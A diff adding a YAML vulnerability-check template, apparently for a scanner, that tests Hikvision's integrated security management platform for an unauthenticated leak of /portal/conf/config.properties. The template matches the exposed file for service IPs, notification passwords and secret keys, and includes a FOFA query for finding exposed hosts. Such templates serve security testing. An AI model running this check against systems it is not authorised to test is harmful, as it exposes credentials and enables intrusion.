@@ -1,0 +1,16 @@
+id: poc-yaml-hikvision-config-properties-unauthorized
+info:
+  name: 海康威视综合安防管理平台 config.properties 信息泄露
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 海康威视综合安防管理平台
+  fofa: app="HIKVISION-综合安防管理平台"
+requests:
+- method: GET
+  path: /portal/conf/config.properties
+  expression: "status_code == 200 && \ncontains(body,\"@bic.serviceDirectory.ip\"\
+    ) &&\ncontains(body,\"@bic.notify.password\") &&\ncontains(body,\"parent.secretKey\"\
+    )\n"
+variables: {}
+transport: http
